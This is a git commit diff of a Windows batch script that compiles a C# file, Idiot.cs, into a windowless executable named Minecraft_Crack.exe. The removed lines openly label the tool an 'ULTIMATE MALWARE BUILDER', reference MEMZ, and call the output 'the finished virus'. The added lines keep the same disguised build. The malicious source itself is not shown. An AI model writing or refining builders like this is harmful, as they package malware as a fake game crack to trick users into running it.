36b7a7b0569a438069b7b20e963424249c0b00ac
xoxojojo <kornelzietek7@gmail.com>
2026-03-25 15:18:20 +0100

    Update lol.bat

--- lol.bat
+++ lol.bat
@@ -1,58 +1,22 @@
 @echo off
-color 0b
-title MEMZ & MINECRAFT CRACK COMPILER
-echo ========================================
-echo   ULTIMATE MALWARE BUILDER v3.0
-echo ========================================
-echo.
-
-:: 1. FORCE THE SCRIPT TO STAY IN ITS OWN FOLDER (Fix for lol-main)
+title COMPILER DEBUG
 cd /d "%~dp0"
 
-:: 2. CHECK FOR ADMINISTRATOR PRIVILEGES
-net session >nul 2>&1
-if %errorLevel% neq 0 (
-    echo [ERROR] PLEASE RUN AS ADMINISTRATOR!
-    echo Right-click this file and select 'Run as Administrator'.
-    echo.
-    pause
-    exit
-)
+echo [1] Checking for Idiot.cs...
+if not exist "Idiot.cs" echo ERROR: Idiot.cs not found! & pause & exit
 
-:: 3. SEARCH FOR SOURCE CODE
-if not exist "Idiot.cs" (
-    echo [ERROR] Idiot.cs NOT FOUND in this folder!
-    echo Current Path: %cd%
-    echo.
-    dir /b
-    pause
-    exit
-)
+echo [2] Searching for Compiler...
+set "C=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+if not exist "%C%" set "C=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+if not exist "%C%" echo ERROR: .NET Framework not found! & pause & exit
 
-:: 4. LOCATE THE .NET COMPILER (CSC.EXE)
-set "CSC64=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
-set "CSC32=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
+echo [3] Compiling...
+"%C%" /target:winexe /out:"Minecraft_Crack.exe" "Idiot.cs"
 
-if exist "%CSC64%" (
-    set "CSC=%CSC64%"
-) else if exist "%CSC32%" (
-    set "CSC=%CSC32%"
-) else (
-    echo [ERROR] .NET Framework 4.0 or higher is not installed!
-    pause
-    exit
-)
-
-echo [SYSTEM] Compiler Found: %CSC%
-echo [SYSTEM] Building: Idiot.cs...
-echo.
-
-:: 5. THE COMPILATION COMMAND
-:: /target:winexe  - Makes it a background app (no console window)
-:: /out:           - Sets the name of the finished virus
-"%CSC%" /target:winexe /r:System.Windows.Forms.dll /r:System.Drawing.dll /out:"Minecraft_Crack.exe" "Idiot.cs"
-
-:: 6. FINAL CHECK
+echo [4] Check result:
 if exist "Minecraft_Crack.exe" (
-    echo.
-    echo =
+    echo SUCCESS! Minecraft_Crack.exe is ready.
+) else (
+    echo FAILED! Check your Idiot.cs code for errors.
+)
+pause
